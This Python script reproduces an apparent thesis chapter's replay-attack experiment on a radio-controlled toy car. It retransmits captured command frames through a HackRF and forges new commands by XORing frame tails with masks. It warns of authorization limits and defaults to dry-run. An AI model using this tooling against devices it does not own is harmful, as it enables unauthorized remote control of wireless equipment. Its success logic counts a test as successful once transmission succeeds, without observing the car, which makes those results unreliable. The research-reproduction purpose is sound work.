#!/usr/bin/env python3
"""
Chapter 3 Replay Attack Reproduction Script - 论文第3章 リプレイ攻撃実験の完全再現

このスクリプトは論文3.5節のリプレイ攻撃実験を再現し、
実験環境が論文と一致することを確認します。

⚠️ 授権边界警告 ⚠️
本脚本仅用于以下授权场景：
  - 复现论文第 3 章的实验结果
  - 在屏蔽环境或同轴直连条件下测试
  - 仅针对自有设备进行测试

默认为 dry-run 模式（不实际发射），需要添加 --confirm-tx 参数才能真实发射。

対応する論文章節:
- 3.3節: 信号キャプチャ (capture.py)
- 3.4節: フレーム構造解析 (analyze_frames.py)
- 3.5節: リプレイ攻撃 (本スクリプト)
"""

import argparse
import json
import os
import sys
import time
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from physical_experiment.runtime import load_experiment_config

try:
    import numpy as np
except ImportError:
    print("Error: numpy not installed. Run: pip install numpy")
    sys.exit(1)

try:
    import yaml
except ImportError:
    print("Error: pyyaml not installed. Run: pip install pyyaml")
    sys.exit(1)

# Import replay functions
from physical_experiment.scripts.replay import (
    hex_to_bits,
    bits_to_iq,
    save_iq_samples,
    transmit_hackrf,
    transmit_frame_hex
)


def load_config(config_path=None):
    """Load experiment configuration."""
    try:
        return load_experiment_config(config_path)
    except FileNotFoundError as exc:
        print(f"Error: {exc}")
        sys.exit(1)


def xor_hex(hex1, hex2):
    """XOR two hex strings of equal length."""
    if len(hex1) != len(hex2):
        raise ValueError(f"Hex strings must be same length: {len(hex1)} vs {len(hex2)}")

    result = []
    for c1, c2 in zip(hex1, hex2):
        xored = int(c1, 16) ^ int(c2, 16)
        result.append(f'{xored:x}')
    return ''.join(result)


def synthesize_command(base_tail, xor_mask):
    """
    Synthesize a new command using GF(2) XOR operation.

    论文3.4.2節: 差分マスクによるコマンド合成

    Args:
        base_tail: Base command tail (5 bytes hex)
        xor_mask: XOR mask to apply (5 bytes hex)

    Returns:
        New command tail (5 bytes hex)
    """
    return xor_hex(base_tail.lower(), xor_mask.lower())


class Chapter3Experiment:
    """
    Chapter 3 Replay Attack Experiment Runner.

    論文3.5節のリプレイ攻撃実験を再現するクラス。
    """

    def __init__(self, config, dry_run=False, verbose=True, repeat: int = 3, wait_time: float = 2.0):
        self.config = config
        self.dry_run = dry_run
        self.verbose = verbose
        self.default_repeat = max(1, int(repeat))
        self.default_wait = max(0.0, float(wait_time))

        # Frame parameters
        self.prefix = config['chapter3_frame']['prefix']
        self.commands = config['chapter3_frame']['commands']
        self.xor_masks = config['chapter3_frame']['xor_masks']

        # Hardware parameters
        self.freq_hz = config['hardware']['frequency_hz']
        self.sample_rate_hz = config['hardware']['sample_rate_hz']
        self.tx_gain_db = config['hardware']['tx']['gain_db']

        # Results
        self.results = {
            'experiment_info': {
                'paper_reference': '22AJ603',
                'chapter': '3.5',
                'title': 'リプレイ攻撃実験',
                'date': datetime.now().isoformat(),
                'dry_run': dry_run
            },
            'frame_structure': {
                'prefix': self.prefix,
                'prefix_length_bytes': len(self.prefix) // 2
            },
            'command_tests': [],
            'synthesis_tests': [],
            'summary': {}
        }

    def log(self, message):
        """Print log message if verbose."""
        if self.verbose:
            print(message)

    def build_frame(self, tail):
        """Build complete frame from tail."""
        return self.prefix + tail

    def test_command(self, name, tail, description, wait_time=None, repeat=None):
        """
        Test a single command.

        Args:
            name: Command name
            tail: Command tail (5 bytes hex)
            description: Description of expected response
            wait_time: Time to wait for response observation (seconds)
            repeat: Number of times to repeat transmission

        Returns:
            Test result dict
        """
        frame_hex = self.build_frame(tail)
        if wait_time is None:
            wait_time = self.default_wait
        if repeat is None:
            repeat = self.default_repeat

        self.log("")
        self.log(f"Testing command: {name}")
        self.log(f"  Tail: {tail}")
        self.log(f"  Full frame: {frame_hex}")
        self.log(f"  Expected: {description}")

        result = {
            'command': name,
            'tail': tail,
            'frame': frame_hex,
            'expected_response': description,
            'transmitted': False,
            'success': None,
            'notes': ''
        }

        if self.dry_run:
            self.log(f"  [DRY RUN] Would transmit {repeat} times")
            result['notes'] = 'Dry run - not transmitted'
            return result

        try:
            # Transmit
            success = transmit_frame_hex(frame_hex, self.config, self.tx_gain_db, repeat)
            result['transmitted'] = True

            if success:
                self.log(f"  [OK] Transmitted successfully")
                self.log(f"  Observe the car for: {description}")
                self.log(f"  Waiting {wait_time} seconds...")
                time.sleep(wait_time)

                # In real experiment, user would observe and confirm
                result['success'] = True  # Assume success if transmission worked
                result['notes'] = 'Transmission successful, observe car response'
            else:
                self.log(f"  [FAIL] Transmission failed")
                result['success'] = False
                result['notes'] = 'Transmission failed'

        except Exception as e:
            self.log(f"  [ERROR] {e}")
            result['success'] = False
            result['notes'] = f'Error: {str(e)}'

        return result

    def run_basic_commands(self):
        """
        Test all basic commands from Table 2 (论文表2).

        これは論文3.5節の基本リプレイ攻撃テストです。
        """
        self.log("")
        self.log("=" * 60)
        self.log("Phase 1: Basic Command Replay (论文表2)")
        self.log("=" * 60)

        # Command descriptions (論文表2の内容)
        descriptions = {
            'light': 'LED 点灯/消灯',
            'demo': 'デモ走行モード開始',
            'left_back': '左輪後退',
            'left_forward': '左輪前進',
            'right_forward': '右輪前進',
            'right_back': '右輪後退',
            'both_forward': '両輪前進 (車体前進)',
            'both_back': '両輪後退 (車体後退)',
            'lb_rf': '逆時針旋回 (左後+右前)',
            'rb_lf': '順時針旋回 (右後+左前)'
        }

        for cmd_name, tail in self.commands.items():
            description = descriptions.get(cmd_name, 'Unknown action')
            result = self.test_command(
                cmd_name,
                tail,
                description,
                wait_time=self.default_wait,
                repeat=self.default_repeat,
            )
            self.results['command_tests'].append(result)

    def run_synthesis_tests(self):
        """
        Test synthesized commands using GF(2) XOR (论文3.4.2節).

        これは差分マスクを使用した改変リプレイ攻撃のテストです。
        """
        self.log("")
        self.log("=" * 60)
        self.log("Phase 2: Synthesized Commands (论文3.4.2節 GF(2)差分)")
        self.log("=" * 60)

        # Test synthesis examples from config
        if 'synthesized_examples' in self.config['chapter3_frame']:
            for name, expected_tail in self.config['chapter3_frame']['synthesized_examples'].items():
                self.log(f"\nVerifying synthesized command: {name}")
                self.log(f"  Expected tail: {expected_tail}")

                # Try to reconstruct the synthesis
                if name == 'both_forward_light':
                    base = self.commands['both_forward']
                    mask = self.xor_masks['v_light']
                    computed = synthesize_command(base, mask)
                    formula = f"both_forward XOR v_light = {base} XOR {mask}"
                elif name == 'left_forward_light':
                    base = self.commands['left_forward']
                    mask = self.xor_masks['v_light']
                    computed = synthesize_command(base, mask)
                    formula = f"left_forward XOR v_light = {base} XOR {mask}"
                elif name == 'right_forward_light':
                    base = self.commands['right_forward']
                    mask = self.xor_masks['v_light']
                    computed = synthesize_command(base, mask)
                    formula = f"right_forward XOR v_light = {base} XOR {mask}"
                else:
                    self.log(f"  [SKIP] Unknown synthesis pattern")
                    continue

                self.log(f"  Formula: {formula}")
                self.log(f"  Computed: {computed}")

                if computed.lower() == expected_tail.lower():
                    self.log(f"  [OK] Synthesis verified!")
                else:
                    self.log(f"  [WARN] Mismatch: computed={computed}, expected={expected_tail}")

                # Test the synthesized command
                result = self.test_command(
                    name,
                    expected_tail,
                    f"合成コマンド: {name.replace('_', ' ')}",
                    wait_time=self.default_wait,
                    repeat=self.default_repeat,
                )
                result['synthesis'] = {
                    'formula': formula,
                    'computed': computed,
                    'expected': expected_tail,
                    'verified': computed.lower() == expected_tail.lower()
                }
                self.results['synthesis_tests'].append(result)

        # Additional synthesis tests
        self.log("\n--- Additional XOR Tests ---")

        # Test: both_forward XOR M_FB = both_back?
        both_forward = self.commands['both_forward']
        m_fb = self.xor_masks['M_FB']
        computed_back = synthesize_command(both_forward, m_fb)
        expected_back = self.commands['both_back']

        self.log(f"\nDirection reversal test (前進↔後退):")
        self.log(f"  both_forward XOR M_FB = {both_forward} XOR {m_fb}")
        self.log(f"  Computed: {computed_back}")
        self.log(f"  Expected (both_back): {expected_back}")

        match = computed_back.lower() == expected_back.lower()
        self.log(f"  Match: {'YES' if match else 'NO'}")

        self.results['synthesis_tests'].append({
            'test': 'direction_reversal',
            'formula': f'both_forward XOR M_FB',
            'computed': computed_back,
            'expected': expected_back,
            'match': match
        })

    def run_all(self):
        """Run complete Chapter 3 experiment."""
        self.log("")
        self.log("=" * 60)
        self.log("論文第3章 リプレイ攻撃実験 - Complete Reproduction")
        self.log("=" * 60)
        self.log(f"Date: {self.results['experiment_info']['date']}")
        self.log(f"Frequency: {self.freq_hz / 1e9:.4f} GHz")
        self.log(f"Prefix: {self.prefix}")
        self.log(f"Dry run: {self.dry_run}")

        # Run tests
        self.run_basic_commands()
        self.run_synthesis_tests()

        # Generate summary
        self.generate_summary()

        return self.results

    def generate_summary(self):
        """Generate experiment summary."""
        basic_tests = self.results['command_tests']
        synthesis_tests = [t for t in self.results['synthesis_tests']
                         if 'command' in t]  # Only command tests

        basic_success = sum(1 for t in basic_tests if t.get('success'))
        synthesis_success = sum(1 for t in synthesis_tests if t.get('success'))

        self.results['summary'] = {
            'basic_commands': {
                'total': len(basic_tests),
                'transmitted': sum(1 for t in basic_tests if t.get('transmitted')),
                'success': basic_success
            },
            'synthesis_commands': {
                'total': len(synthesis_tests),
                'transmitted': sum(1 for t in synthesis_tests if t.get('transmitted')),
                'success': synthesis_success
            },
            'xor_verifications': {
                'total': len([t for t in self.results['synthesis_tests'] if 'match' in t]),
                'verified': sum(1 for t in self.results['synthesis_tests']
                               if t.get('match') or t.get('synthesis', {}).get('verified'))
            },
            'conclusion': ''
        }

        # Determine conclusion
        if self.dry_run:
            conclusion = 'Dry run completed - no actual transmissions'
        elif basic_success == len(basic_tests) and synthesis_success == len(synthesis_tests):
            conclusion = '論文3.5節のリプレイ攻撃結果を完全に再現'
        elif basic_success > 0:
            conclusion = '部分的に再現成功 - 詳細は結果を確認'
        else:
            conclusion = '再現失敗 - ハードウェア接続を確認'

        self.results['summary']['conclusion'] = conclusion

        # Print summary
        self.log("")
        self.log("=" * 60)
        self.log("Summary")
        self.log("=" * 60)
        self.log(f"Basic commands: {basic_success}/{len(basic_tests)} successful")
        self.log(f"Synthesized commands: {synthesis_success}/{len(synthesis_tests)} successful")
        self.log(f"XOR verifications: {self.results['summary']['xor_verifications']['verified']}/"
                f"{self.results['summary']['xor_verifications']['total']} verified")
        self.log(f"\nConclusion: {conclusion}")

    def save_results(self, output_path):
        """Save results to JSON file."""
        Path(output_path).parent.mkdir(parents=True, exist_ok=True)
        with open(output_path, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        self.log(f"\nResults saved to: {output_path}")


def main():
    parser = argparse.ArgumentParser(
        description="Reproduce Chapter 3 replay attack experiment (论文3.5節)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Run all commands (论文表2)
  python replay_chapter3.py --all-commands

  # Run with synthesis tests (论文3.4.2節)
  python replay_chapter3.py --all-commands --synthesis

  # Dry run (no actual transmission)
  python replay_chapter3.py --all-commands --dry-run

  # Test specific command
  python replay_chapter3.py --command light

  # Full experiment with output
  python replay_chapter3.py --full --output results/chapter3_results.json
"""
    )

    parser.add_argument('--all-commands', action='store_true',
                        help='Test all basic commands from Table 2')
    parser.add_argument('--config', type=str, default=None,
                        help='Config file path')
    parser.add_argument('--synthesis', action='store_true',
                        help='Include synthesis tests (论文3.4.2節)')
    parser.add_argument('--full', action='store_true',
                        help='Run complete experiment (all commands + synthesis)')
    parser.add_argument('--command', '-c', type=str, default=None,
                        choices=['light', 'demo', 'left_back', 'left_forward',
                                 'right_forward', 'right_back', 'both_forward',
                                 'both_back', 'lb_rf', 'rb_lf'],
                        help='Test specific command only')
    parser.add_argument('--repeat', '-r', type=int, default=3,
                        help='Number of times to repeat each transmission (default: 3)')
    parser.add_argument('--wait', '-w', type=float, default=2.0,
                        help='Wait time between commands in seconds (default: 2.0)')
    parser.add_argument('--gain', '-g', type=int, default=None,
                        help='Override TX gain in dB (default: from config)')
    parser.add_argument('--output', '-o', type=str, default=None,
                        help='Output JSON file for results')
    parser.add_argument('--dry-run', action='store_true', default=True,
                        help='Generate signals without transmitting (DEFAULT)')
    parser.add_argument('--confirm-tx', action='store_true',
                        help='Actually transmit signals (requires explicit confirmation)')
    parser.add_argument('--quiet', '-q', action='store_true',
                        help='Suppress verbose output')

    args = parser.parse_args()

    # Safety: default to dry-run unless --confirm-tx is specified
    if args.confirm_tx:
        args.dry_run = False

    # Load config
    config = load_config(args.config)

    # Override gain if specified
    if args.gain is not None:
        config['hardware']['tx']['gain_db'] = args.gain

    # Create experiment
    experiment = Chapter3Experiment(
        config,
        dry_run=args.dry_run,
        verbose=not args.quiet,
        repeat=args.repeat,
        wait_time=args.wait,
    )

    # Determine what to run
    if args.full:
        results = experiment.run_all()
    elif args.command:
        # Single command test
        print("=" * 60)
        print(f"Testing single command: {args.command}")
        print("=" * 60)

        tail = config['chapter3_frame']['commands'].get(args.command)
        if not tail:
            print(f"Error: Unknown command: {args.command}")
            sys.exit(1)

        result = experiment.test_command(
            args.command,
            tail,
            f"Test {args.command}",
            wait_time=args.wait,
            repeat=args.repeat
        )
        experiment.results['command_tests'].append(result)
        experiment.generate_summary()
        results = experiment.results
    elif args.all_commands:
        experiment.run_basic_commands()
        if args.synthesis:
            experiment.run_synthesis_tests()
        experiment.generate_summary()
        results = experiment.results
    elif args.synthesis:
        experiment.run_synthesis_tests()
        experiment.generate_summary()
        results = experiment.results
    else:
        parser.print_help()
        print("\nError: Must specify --all-commands, --synthesis, --full, or --command")
        sys.exit(1)

    # Save results
    if args.output:
        experiment.save_results(args.output)
    else:
        # Default output path
        results_dir = Path(__file__).parent.parent / "results"
        results_dir.mkdir(exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        default_output = results_dir / f"chapter3_replay_{timestamp}.json"
        experiment.save_results(str(default_output))

    # Final status
    if results['summary'].get('conclusion', '').startswith('論文'):
        print("\n[OK] Chapter 3 experiment completed successfully")
        print("Next step: Proceed to Phase 2 (Channel measurement)")
    elif args.dry_run:
        print("\n[OK] Dry run completed")
        print("Remove --dry-run flag to perform actual transmissions")
    else:
        print("\n[!] Check results for details")


if __name__ == "__main__":
    main()
